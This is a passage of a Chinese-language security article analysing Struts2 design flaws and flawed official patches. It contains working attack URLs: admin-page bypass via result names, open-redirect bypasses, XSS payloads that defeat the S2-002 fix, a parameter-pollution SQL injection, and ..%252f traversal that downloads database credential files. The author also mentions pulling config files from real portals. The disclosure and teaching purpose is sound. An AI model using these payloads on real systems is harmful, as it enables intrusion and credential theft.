<p>再回头看看我们在action中的属性定义，你会发现，现在他们都成了漏洞，因为struts2规定属性的get和 set方法，都必须是public的。 那么我们定义了 private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } 这段代码的时候，实际上，是写了两个public的方法。 那这两个表面上没有任何实质含义的方法，会有什么安全隐患呢？ 这需要和前文联系起来，前文提到，我们在struts.xml文件中，定义如下： <action name="user" class="net.inbreak.UserAction"> <result name="success">user/userlist.jsp</result> <result name="addUser">user/addUser.jsp</result> <result name="added">user/added.jsp</result> <result name="false">user/false.jsp</result> </action> 这段代码含义是，UserAction中，任何一个方法执行后，如果返回的是success这个字符串， 就会把 user/userlist.jsp返回给用户。 如果返回是addUser，就会把user/addUser.jsp返回给用户。 现在UserAction是管理用户的页面，在我们的系统中，有普通管理员和超级管理员，他们的区别是普通管理员 可以查看用户，但是不能添加一个用户。 所以，我们在UserAction中，写了 public String addUser(){ if(true){ //事实上这里是个超级管理员的判断，我偷懒了。 return &quot;false&quot;; } return &quot;addUser&quot;; } 这个方法的代码判断了不允许普通管理员访问，但是user/addUser.jsp这个jsp页面中并没有这个判断逻辑。 因为开发认为只有返回addUser的时候，才会来到这个页面，而要返回addUser，则必须通过超级管理员的验证。 那我们能让一个方法返回addUser么？当然可以！ <a href="http://www.inbreak.net/app/user!getUsername.action?username=addUser">http://www.inbreak.net/app/user!getUsername.action?username=addUser</a> 这个链接，struts2会怎么处理呢？ 他会找struts.xml中，对应段路径user，于是找到了对应的处理Action（net.inbreak.UserAction）， 由于路径中有了“!getUsername”，于是就去找这个Action中的getUsername这个方法，很明显，这个方法其实 是username这个属性的get方法，如果你要让Action接收用户提交的username，你就必须要定义这个方法。 那这个方法会返回什么呢？会返回action的字段username的值！哈哈！username用户已经提交给action了， 链接后面写着“?username=addUser”，struts2把这个值赋予了action中的username属性。那这里返回的当然 就是“addUser”！ <img src="" alt=""> 一系列巧合后，导致现在给用户返回了user/addUser.jsp页面，这是一个添加用户的表单页面，并且用户没 有去走验证是否为超级管理员这一步。 现在用户看到了一个添加用户的页面，他有两种攻击思路： 1，直接提交，如果处理用户提交的那个action没有再次判断用户身份，那就提交成功了。 2，如果他判断了用户身份，我们还可以csrf他，因为我们知道了这个action的地址，和它需要的参数！ 由于struts2的action和jsp文件分离，导致开发人员往往会在action的方法中，执行权限判断，而jsp页面中 并没有再次执行这个判断，他以为action判断就够了。而偏偏action的属性，给我们带来了一个可自定义返回 result的方法，导致我们可以绕过action访问jsp页面。</p>
<h3 id="struts2-result-redirect-">Struts2的那些result类型缺陷（redirect）</h3>
<p>刚才我们领教了struts2给我们带来那些属性的好处，现在我们再往后走一步，研究Action方法的返回结果。 其实并不是只由String类型的返回结果，struts2还有其他类型的返回，比如“redirect”类型。 <action name="test" class="net.inbreak.TestAction"> <result name="false">user/false.jsp</result> <result name="redir" type="redirect">${redirecturl}</result> </action> 这段代码，大家唯一可能看不懂的，就是type=&quot;redirect&quot;了。 这是一个url redirect的方式，struts2为了方便大家开发，把“自定义302跳转到其他url”这种方式给包装了 起来。只要如上定义，我们就可以在action中写方法： public String redirect() { return &quot;redir&quot;; } 然后定义属性 private String redirecturl; 当用户打开 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp">http://www.inbreak.net/app/test!redirect.action?redirecturl=/a.jsp</a> 的时候，就会302跳转到 <a href="http://www.inbreak.net/app/a.jsp" target="_blank">http://www.inbreak.net/app/a.jsp</a> 这是很常见的url跳转应用，在struts2中，如上配置一下，就可以实现。 相信明眼人都看出来了，很明显这里存在url跳转漏洞，如果用户输入了 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=http://www.ph4nt0m.org</a> 就会跳转到<a href="http://www.ph4nt0m.org这个钓鱼网站(-_-!)。那么如何防御呢？" target="_blank">http://www.ph4nt0m.org这个钓鱼网站(-_-!)。那么如何防御呢？</a> 要防御url跳转到钓鱼网站，我们肯定需要一个白名单机制，或者根本就让他跳转到本站下。于是有了如下判断： public String redirect() { if(redirecturl.startsWith(&quot;/&quot;)) { return &quot;redir&quot;; } return &quot;false&quot;; } 可能你看出来了，仅仅判断&quot;/&quot;开头，其实是不能杜绝url跳转漏洞的，因为 <a href="http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!redirect.action?redirecturl=//www.ph4nt0m.org</a> 一样会跳转。而在这里却足够了，因为struts2已经接管了这个过程，只要以“/”开头，统统先给你自动加上 本地域名，抓包后，你会看到 location: <a href="http://www.inbreak.net/app//www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app//www.ph4nt0m.org</a> 实际上是不会有问题的。 struts2也认为这样判断不会有问题了，然而用户输入 <a href="http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org" target="_blank">http://www.inbreak.net/app/test!getStr.action?str=redir&amp;redirecturl=http://www.ph4nt0m.org</a> <img src="" alt=""> 其实前篇已经分析过了，这样就利用action中的str属性，绕过了必须以“/”开头的判断，直接跳转了。 test里有个str属性，可自定义返回，这里自定义了“redir”，所以来到了 <result name="redir" type="redirect">${redirecturl}</result> 而redirecturl的值，也提交给了action，所以跳转了。</p>
<h3 id="struts2-result-ajax-">Struts2的那些result类型缺陷（Ajax）</h3>
<p>在struts2中使用ajax，也是被struts2支持的，它提供了一种返回类型，叫做“stream”。在研究这个 result的使用时，作者看到一本书，叫做《 Struts 2权威指南：基于WebWork核心的MVC开发 》。这本书非常 出名，几乎所有的struts2使用者都推荐使用。 <a href="http://book.csdn.net/bookfiles/479/index.html" target="_blank">http://book.csdn.net/bookfiles/479/index.html</a> 书上介绍ajax可以这么使用： 配置struts.xml <action name="ajaxtest" class="net.inbreak.ajax.TestajaxAction"> <result type="stream"> <param name="contentType">text/html</param> <param name="inputName">input</param> </result> </action> 之后写TestajaxAction： public InputStream input; public String execute() throws Exception{ input = new StringBufferInputStream(&quot;aaaa<td><script>alert(&quot;kxlzx&quot;)</script>aa&quot;); return SUCCESS; } 其实大家都看出来我的意思了，返回了contentType为“text/html”的页面，内容为 aaaa<td><script>alert(&#39;kxlzx&#39;)</script>aa 结果浏览器解析的时候，出现了XSS漏洞。 本来默认的contentType是text/plain，不需要配置，如果用户直接打开，只会看到一个Stream，不会解析 其中的html和js。现在书上介绍说要写成这样，不知道作者是否知道这个教程对大家的影响，结果已经误导了 大批的开发人员。 事实上，这不是struts的问题，是struts“权威”教程的问题。权威的教程，一旦出现安全漏洞，往往会 误导大批的开发人员，不知道大家在挖漏洞的时候，是否注意到了这点，特别是当官方的DEMO出现漏洞， 那绝对是惊天地泣鬼神的悲剧。</p>
<h3 id="struts2-result-">Struts2的那些result类型缺陷（自定的页面）</h3>
<p>有时候，开发人员为了方便，喜欢配置struts.xml如下： <action name="test" class="net.inbreak.TestAction"> <result name="success">user/test.jsp</result> <result name="testpro">user/testproperty.jsp</result> <result name="redir" type="redirect">${redir}</result> <result name="testloadfilepath">${testloadfilepath}</result> <result name="false">user/redirfalse.jsp</result> <result name="input">user/input.jsp</result> </action> 请注意，其中一条result，名称是”testloadfilepath”， ${testloadfilepath}的作用是自定义的jsp页面 地址，接收session或request中传过来的这个变量的值。那么用户提交 <a href="http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp">http://www.inbreak.net/app/test.action?testloadfilepath=user/test.jsp</a> 当然就会返回user/test.jsp页面，非常的灵活。虽然并不是所有的开发都会这么做，但是一旦出现这种情况， 会产生什么问题呢？ <a href="http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/test!getRedir.action?redir=testloadfilepath&amp;testloadfilepath=WEB-INF/classes/hibernate.cfg.xml</a> 不知道大家看懂这段url的含义没有，先调用getRedir，可以自定义返回到testloadfilepath，而testloadfilepath 已经指定了WEB-INF/classes/hibernate.cfg.xml。WEB-INF目录下，都是受web容器保护的东西，默认不允许 直接request相对地址来访问。该目录里面有程序编译后的class文件（可以被直接反编译为java源码）， 有数据库配置文件等敏感文件，现在打开如上url，直接被下载了hibernate.cfg.xml，这里放着数据库用户名 和密码。 <img src="" alt=""> 这样，攻击者就可以下载你的所有源代码，所有服务器上的文件。struts在提供给我们这种方式的时候， 并没有任何官方说明这里有危险，这就是一个不定时炸弹。</p>
<h3 id="struts2-taglib-">Struts2的taglib设计缺陷</h3>
<p>经过几个例子下来，不知道大家注意到没有，从用户输入走到这里，已经走到了输出这一步了。struts2的 那些result的type，其实就是几种输出方式，有jsp、ajax、redirect，经过jsonplugin等插件配置，还可以 支持其他输出方式。甚至支持一些标签库，比如freemarker等标签库。不过我们只谈struts2自带的标签库， 在一个jsp页面的最上方，写上一段代码，就可以使用struts2提供的数据输出和页面数据操作的标签了。 比以往我们在jsp输出“&lt;%=name%&gt;”要方便的多，下面给个例子： test.jsp代码 &lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt; <s:property value="username"/> 第一行是告诉struts这里要使用struts的标签库，第二行就是一个标签的使用，含义是输出username的值， username会从session、request、page等地方取，这里不关注取数据的次序。</p>
<h3 id="struts2-taglib-struts2-0-escapejavascript-">struts2的taglib设计缺陷（struts2.0不支持escapeJavaScript）</h3>
<p>说到输出，大家都能想到XSS漏洞，那么作为一个流行框架，struts2在这里做了什么控制呢？ struts2.0对部分标签做了默认的htmlescape： 刚才那个标签实际上效果等于 <s:property value="username" escape="true"/> 别以为做了htmlescape就够了，输出在javascript中的时候，还会出现xss漏洞。所以struts在2.1.6这个版本 也支持了javascriptescape： struts2.1.6： <s:property value="pass" escape="true" escapeJavaScript="false"/> 默认开启如上所示，当你要输出到js中的时候，可以使用escapeJavaScript进行转义。 也就是说，一旦你确定这个struts是2.0的，只要开发人员把变量输出到js中，十有八九会出xss问题。</p>
<h3 id="struts2-taglib-">struts2的taglib设计缺陷（没有富文本安全输出标签）</h3>
<p>而包括最高版本2.1.8在内，仍然没有支持富文本安全输出，这是一件悲剧的事情，如果用struts开发一个 大众blog的应用，又支持富文本的文章，开发人员只能把htmlescape和jsescape都去掉，才能保证业务正常 运行，所以导致了XSS漏洞。</p>
<h3 id="struts2-taglib-htmlescape-">struts2的taglib设计缺陷（并不是所有输出标签都做了默认的htmlescape）</h3>
<p>有几个标签是不做htmlescape的，比如 <s:a> <s:text> <s:url> 这其实是一个严重陷阱，因为只要提到struts2，前辈们都会告诉你，放心使用，它默认做了htmlescape。 那是什么原因导致一些标签没有做默认的escape呢？作者翻了下源码，也没有找出具体原因，不知道那些人 是怎么想的。 并且，经过简单的fuzz，发现在特定环境下，那些做了输出转义的标签也会出现问题。 我们知道默认的htmlescape是不转义单引号的，所以，当struts标签库的源码中，出现一些标签属性的输出 时，如果标签属性的周围使用的是单引号，而攻击者又能控制标签属性内容的时候，就会出现xss漏洞。如下： <input name="username" onclick='xss'> 当这个xss的内容可以由攻击者控制，即使对xss的内容作了htmlescape，依然可以被攻击者bypass。 基于这个原理，作者搜索了struts标签库源码，那些“XXX.ftl”文件中搜索“}&#39;”符号，找到N多，测试 其中一个如下： ------------- <s:textfield >标签，在正常使用的时候，他会放到一个<s:form>标签内，最终输出html后，会变成一个输入框。 它有个属性叫“tooltip”，如果这个标签为用户可控制，比如从数据库中读取用户输入，而这个标签所在的 <s:form>开启了： <s:form tooltipConfig="/#{'jsTooltipEnabled':'true'}"> 的时候，用户输入的tooltip的值，会出现以下情况： struts2.0 --&gt; <span dojoType="tooltip" ... caption="kxlzx<script></script>"> caption内容就是tooltip的值，从数据库查出 struts2.1.6&amp;struts2.1.8 --&gt; <img onmouseover="domTT_activate(this, …'StrutsTTClassic');alert('xss');a('','styleClass’…" /> onmouseover生成一个domTT_activate函数调用，参数中其中一个值，是tooltip的内容。这里被bypass了。 ------------ 这些搜出的几个个地方实际上根本没有做任何escape，就直接输出了数据。下面那个即使做了默认的 htmlescape，还是会出问题，除非它默认做了javascriptEscape。struts2默认有地方做javascriptEscape么？ 答案是“没有”。所以，它们全都能被XSS！ <img src="" alt=""> struts2的这些escape，其实是一个很太监的安全方案，安全工程师最恨的就是这种方案，做了安全方案， 还不做完全，留下一堆问题。</p>
<h3 id="struts2-http-parameter-pollution-">struts2的HTTP Parameter Pollution处理缺陷</h3>
<p>webwork和struts2都有这个问题，当用户给web应用提交: <a href="http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61</a> 时，如果我们在action中定义了 private String redir; public String getRedir() { return redir; } public void setRedir(String redir) { this.redir = redir; } Action就会取到redir的值为“kxlzx, aaad61”注意中间是有空格的。 这种数据是由webwork（struts2）把两个参数合并而成的，但是如果我们request.getParameter(&quot;redir&quot;); 拿到的值，却只是第一个（值为kxlzx）。 我们知道struts2提倡使用拦截器做一些事情，他可以在action的execute方法执行之前和之后做一些操作。 那就有一些开发，想当然的在这里防御一下url跳转、SQL注入、XSS等攻击。我们看看他们会怎么做： @Override public String intercept(ActionInvocation arg0) throws Exception { …… String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ System.out.println(&quot;find sql injection&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find sql injection&quot;); return &quot;falseuser&quot;; } String redir = request.getParameter(&quot;redir&quot;); if(redir!=null&amp;&amp;!redir.equals(&quot;<a href="http://www.b.com&quot;)){" target="_blank">http://www.b.com&quot;)){</a> System.out.println(&quot;find url redirect&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find url redirect&quot;); return &quot;falseuser&quot;; } return arg0.invoke(); } 在这段代码中，作者仅仅示例了在拦截器中防御sql注入和url跳转漏洞，sql注入的防御规则是检查 “’”单引号，而url跳转漏洞规则是检查必须跳转到”<a href="http://www.b.com”去。作者知道没有完全防御，" target="_blank">http://www.b.com”去。作者知道没有完全防御，</a> 所以大家先不要在这里追究防御方案，仅仅是一个示例。 而开发人员在业务代码如下： String sql = &quot;select book_name,book_content from books&quot;; if (name != null) { sql += &quot; where book_name like &#39;%&quot; + name + &quot;%&#39;&quot;; } 很明显能注入。 public String redirect() { return &quot;redir&quot;; } 也明显存在url跳转漏洞。 但是由于拦截器在action之前执行，所以如果我们输入了 <a href="http://www.inbreak.net/app/test!findUserByName.action?name=a" target="_blank">http://www.inbreak.net/app/test!findUserByName.action?name=a</a>&#39; 拦截器当然就会返回错误“find sql injection”； <img src="" alt=""> 因为执行到了 String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ 发现name的值确实有单引号。 但是如果我们输入了 <a href="http://www.inbreak.net/app/test!findUserByName.action" target="_blank">http://www.inbreak.net/app/test!findUserByName.action</a> ?name=aaaaa&amp;name=a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; <img src="" alt=""> 就直接绕过了拦截器的判断。因为拦截器获取的request.getParameter(&quot;name&quot;)，是第一个参数的值aaaaa， 抛弃了第二个参数的值，但是action中的name的值，却是 “aaaaa, a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; ”所以被注入了 大多数拦截器都是这样做的防御，包括一些filter等。 这件事情发生在url跳转漏洞时，却不明显，因为攻击者顶多构造一个： <a href="http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net</a> 抓包看看 <img src="" alt=""> 它跳到了<a href="http://www.b.com" target="_blank">http://www.b.com</a>, www.inbreak.net去了。所以IE直接报错，说打不开这个地址。但是我们还有别的 浏览器，总是喜欢给大家友好信息的浏览器，看看chrome给用户什么提示： <img src="" alt=""> Chrome也认为这是一个错误的链接，所以给出了“正确”的链接地址。这不是刚好被钓鱼网站利用么？ struts2的官方漏洞公告和修补后引发的安全缺陷 从有struts2，到现在为止，官方一共发布了4个漏洞，在 <a href="http://struts.apache.org/2.x/docs/security-bulletins.html" target="_blank">http://struts.apache.org/2.x/docs/security-bulletins.html</a> /<em> S2-001 — Remote code exploit on form validation error /</em> S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and <s:a> tags /<em> S2-003 — XWork ParameterInterceptors bypass allows OGNL statement execution /</em> S2-004 — Directory traversal vulnerability while serving static content 从名字上，可以看出漏洞的内容，作者仅仅对其中两个做了源码级别的漏洞修补评估，发现了很多悲剧的事情。 同学们有兴趣可以去研究剩下两个漏洞。</p>
<h3 id="struts2-s2-002-">struts2的官方漏洞公告和修补后引发的安全缺陷（S2-002）</h3>
<p>先看看“S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and tags”这个漏洞。 顾名思义是对<s:url>和<s:url>的xss漏洞修补，但是前文提到，这里有XSS漏洞，难道是在忽悠大家？我们 看看这帮工程师是怎么修补的，来到这个svn地址： <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h</a> 注意这两行： <img src="" alt=""> 看到这两行代码的时候，作者笑了，因为作者仿佛看到了至少两件悲剧的事情，现在把它们写成故事： 第1件悲剧的事情，某年某月某日，一个脚本小子给官方报告漏洞，说在使用<s:url>标签的时候，代码为： <s:url action="%{/#parameters.url}"></s:url> 之后他输入了 <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script>alert(&#39;hacked by kxlzx&#39;)</script> 并告诉官方这里是一个XSS漏洞，希望官方修补掉。 官方很重视，一个开发就去修补，添加如下判断： if (result.indexOf(&quot;<script>&quot;) &gt;= 0){ result = result.replaceAll(&quot;<script>&quot;, &quot;script&quot;); 并进行了冒烟测试、功能测试、黑盒测试、白盒测试。认为没有问题了，因为提交攻击者给的恶意url后，输出了 scriptalert(&#39;hacked by kxlzx&#39;)</script> 结果并没有在页面执行xss脚本。后来那脚本小子也测试了一下，发现没问题，这事情就过去了，瞒着人民 大众，悄悄的修补了。 第2件悲剧的事情，又过了某人某月某日，某另一个脚本小子又发了漏洞，还是那段代码，但是url改成了： <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a>&lt;<script>&gt;alert(&#39;hacked by kxlzx&#39;)</script> 注意，这里是&lt;<script>&gt;，经过了replaceAll函数后，刚好变成了<script>，重新组成了XSS漏洞。 官方这次不得不重新重视起来，决定把if判断，变成了while，不管你有多少&lt;&lt;&lt;&lt;&lt;&lt;<script>&gt;&gt;&gt;&gt;&gt;&gt;，都给你变成 scriptalert(&#39;hacked by kxlzx&#39;)</script> 并进行了冒烟测试、功能测试、黑盒测试、白盒测试。这次还发了公告出来，说这里没问题了，我们很重视 安全漏洞，已经修补了。 作者看到这里，测试新的bypass官方修补代码的url为： <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script kxlzx=kxlzx>alert(&#39;hacked by kxlzx&#39;)</script> 于是XSS脚本又被执行了，因为这里是<script kxlzx=kxlzx>，不是<script>，所以不符合判断条件，没有被 replaceAll，再次bypas了漏洞修补。。。</p>
<h3 id="struts2-s2-004-">struts2的官方漏洞公告和修补后引发的安全缺陷（S2-004）</h3>
<p>这个漏洞的修补，比上一个更加令人无奈，这是一个/../获取资源文件的漏洞 S2-004 — Directory traversal vulnerability while serving static content 要了解这个漏洞的成因，大家需要先了解一个知识点。 当struts的FilterDispatcher收到url请求如下两个路径下的文件时： <a href="http://www.inbreak.net/app/struts/" target="_blank">http://www.inbreak.net/app/struts/</a> 或 <a href="http://www.inbreak.net/app/static/" target="_blank">http://www.inbreak.net/app/static/</a> 会去取struts核心包的core.src.main.resources.org.apache.struts2下面的静态资源文件，这些资源文件 其实是一些js脚本和一些css文件。前文提到 <img onmouseover="domTT_activate(this, …'StrutsTTClassic');alert('xss');a('','styleClass’…" /> 代码中的domTT_activate，其实就是 <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> 文件中的一个函数。 在struts2.0的时候，只要你敢上某几个版本的struts2，攻击者就可以通过 <a href="http://www.inbreak.net/app/struts/..%252f" target="_blank">http://www.inbreak.net/app/struts/..%252f</a> <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> 浏览你的web目录，下载web目录下的文件。 先不说漏洞修补，请读者赶紧想想，你公司的开发人员，是否使用了struts2，并且把 “Struts 2.0.0 - Struts 2.0.11.2 ”之间的几个版本包装了或者根本没有包装，直接上了web应用。 如果有这种情况，就可以直接用以上方式攻击，这几天作者找了几个大型门户网站的漏洞，发现他们都存在 这个漏洞，顺便下载了他们的数据库配置文件，同时报告了漏洞。 <img src="" alt=""> Struts官方可能也受到了攻击，于是修补了代码。 作者同样查看了svn修补记录： <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h</a> <img src="" alt=""> 可以看到“ if (!name.endsWith(&quot;.class&quot;)) {”这行代码在修补漏洞时，被删除了。 修补前的代码中，为什么以前要过滤.class文件呢？是因为struts提供了一个功能： 如果开发人员想自己使用这个静态文件映射的功能，可以配置web.xml <filter> <filter-name>struts</filter-name> <filter-class> org.apache.struts2.dispatcher.FilterDispatcher </filter-class> <init-param> <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> </init-param> </filter> 如上配置后，当用户输入 <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> 的时候，实际上struts会去找net.inbreak.action这个文件夹下的domTT.js文件发给用户，而不再寻找核心包 的那个文件夹了。这个功能开放后，官方为了防止对应包下的class文件被下载后反编译成源码，所以写了行 代码，过滤.class文件。 就因为这行代码的存在，一时间，刚巧又正是struts2流行的时代。互联网大批的文章介绍struts2核心源码， 在介绍到FilterDispatcher的时候，必然会提到，这里会过滤.class文件，如果开发人员使用这个功能， 可以放心，自己的class文件不会被人下载。 后来出了漏洞，攻击者可以用 <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> 绕过官方限制，下载class文件。最终的确修补了这个/../的漏洞。然而悲剧的是，因为class文件实际上 还是可以被下载，所以官方修补的同时，去掉了“if (!name.endsWith(&quot;.class&quot;)) { ”这一行代码，可能是 觉得这一行代码太丢人。 曾经的教程，还在互联网上，告诉大家class文件不会被下载，官方也发表声明修补了/../漏洞。但是看到 教程的开发们，却早已把目录映射了静态文件： <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> 如果这个开发的net.inbreak.action包下有个UserLogin.class文件，在struts2有漏洞的版本，会面临 服务器上所有文件被下载的命运。即使开发升级了struts，因为核心代码中的class文件的判断去掉了， 导致这个文件还是可以被 <a href="http://www.inbreak.net/app/struts/UserLogin.class" target="_blank">http://www.inbreak.net/app/struts/UserLogin.class</a> 官方在没有任何通知的前提下，在教程满天飞告诉大家class文件不会被下载的前提下，为了面子悄悄的 取掉了这个判断。这回好了，无论升级否，都不让人消停，万一开发人员头脑发热，配置如下： <param-name>packages</param-name> <param-value>/</param-value> 就出大事了，可以直接下载资源目录下所有文件。 <a href="http://www.inbreak.net/app/struts/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/struts/hibernate.cfg.xml</a> <img src="" alt=""></p>
<h3 id="-">总结</h3>
<p>作者挖了struts2的一些漏洞，也挖了一些web其他框架的漏洞（不在本文范围），总结下挖取这些框架漏洞 的方式。 首先，是上不上框架的问题。一旦开发用了这些框架，web应用会直接面临一些漏洞：</p>
<h3 id="1-">1，开放了某功能，导致采用框架的应用默认漏洞</h3>
<p>因为这个框架在未经允许的情况下，悄悄的打开了某些功能，可能是为了方便开发等作用，结果导致了漏洞 的产生。 举个例： 比如DWR这个AJAX框架一旦使用，在某些版本里，输入 <a href="http://www.inbreak.net/app/dwr/" target="_blank">http://www.inbreak.net/app/dwr/</a> 就能看到一个页面，里面是所有ajax方法的映射，甚至一些service方法没有配置，自动映射了出来。 你可以在这个页面给那些映射出来的方法提交参数，调用方法。比如有个getUserpasswdByid的方法，看名称 就知道，传递用户id，返回密码。 <img src="" alt=""> 再举例就是本文中的struts2的../../漏洞。 如果要挖这种漏洞，绝对是0day级别的漏洞，所以大家有必要怀疑每一个实现步骤，这种漏洞其实大部分就 出现在开发环境和正式环境的差异，以及一些奇奇怪怪的功能点上。</p>
<h3 id="2-">2，扩展了某功能，导致安全问题</h3>
<p>我们的web应用，本来是可以自己写代码实现一些功能的，但是这个框架为了方便开发和管理，把开发人员 要写的代码包装了下，只要简单的几行就能实现原本大批代码才能做到的功能。而这些便利，却带来了很多 安全问题。挖漏洞的同时，应该特别注意哪些地方比原来方便了很多，扩展了很多，这些扩展和方便，是否 考虑到了安全因素。 比如本文介绍的struts的result（urlredirect）相关漏洞。</p>
<h3 id="3-demo-">3，DEMO或教程或用户指南误导</h3>
<p>自从框架出现后，为了让人们最快的了解和使用框架，官方出了很对用户手册，demo等功能。而很多大牛们， 也相应的出了教程或者书籍，但是这些教程，DEMO，书籍上的例子，恰恰产生了很多漏洞。甚至开发本来 不按照教程走，不会有漏洞，却被教程误导了。如果黑客看到这些书籍，请立刻把他列到你的扫描器中， 绝对有不少开发会按照教程上去做。 例如本文提到的那个书籍介绍我们使用ajax的事情。</p>
<h3 id="4-">4，原本有安全方案，但是被某功能代码覆盖</h3>
<p>这其实是一件悲剧的事情，告诉我们要注意在日常开发中和漏洞修补中，是否有不明真相的开发人员， 为了实现某个功能，悄悄的把原本的安全方案断章取义的覆盖掉了。挖漏洞的时候，要特别注意安全方案附件 的代码变动，很可能发现非常弱智的逻辑问题。 例如本文提交的class文件的判断。</p>
<h3 id="5-">5，不完善的安全</h3>
<p>一个安全方案的实施，应该是彻头彻尾的，要注意方案的完整性，不能有些地方方案OK，有些地方不能实施。 在挖漏洞的时候，也不要被安全方案吓住，并不是有了方案，听起来牛X，就绝对不会有漏洞的，最起码应该 经过全面fuzz。 例如本文提到的XSS遗漏点，以及富文本的遗漏。</p>
<h3 id="6-">6，版本升级后，没有醒目安全公告</h3>
<p>我们知道所有的架构师都不愿意有事没事升级框架，特别是不稳定的框架版本，因为这个升级可能带来很多 不可预料的问题，所以可能即使看到了安全公告，也没有去升级。如果不懂安全，更不愿意升级框架了。 所以官方必须做到一个漏洞的修补，一个公告的发布，必须带有相关的代码log。告诉大家具体哪里做了改动。 而挖漏洞的同学更应该盯紧这些地方，百般推敲和测试修改的部分，不要被一次公用的测试结果吓到，模糊的 认为漏洞已经修补了。</p>
<h3 id="7-">7，悲剧的方案</h3>
<p>很多时候，我们会看到官方修补漏洞，或者一些安全方案的实施结果。那是不是真的都能达到修补漏洞的 效果呢？ 例如本文的<s:url>标签的xss漏洞，官方都这个漏洞的修补，真是绞尽脑汁，最终还是悲剧了。</p>
<h3 id="8-">8，优秀的方案，悲剧的执行</h3>
<p>RT，不再说明。</p>
<h3 id="9-web-">9，挑战web服务器配置</h3>
<p>这个问题有必要说一说，struts有事没事做个静态映射做什么？其实是目的就是为了框架和应用分离，很 明显那些js文件应该放在项目中的web目录下，但是为什么要做呢？还不是因为struts包发布的时候，还没有 项目，只有框架。 它为了达到即使上了任何项目，也能有办法访问到它提供的那些js的目的，只好被逼无奈做了这个功能，静态 目录映射。无论任何项目，部署后，只要url后面根目录加上/struts，或者/static就可以访问js。后来做了 这个功能感觉良好还不算，居然把功能提供出来，给推荐给开发人员使用。归根结底是因为struts挑战了 web服务器的配置，非要自己做静态映射。要知道人家web服务器做的映射，是经过多少年黑客入侵打磨出来的， struts有吗？ 这种情况突出在单独映射某目录，单独对某目录做权限，做DIR列表等功能，如果你看到一个框架也做了这种 功能，恭喜你！赶快去挖，十有八九存在漏洞！</p>
<h3 id="10-">10，没有安全方案，也没有提醒</h3>
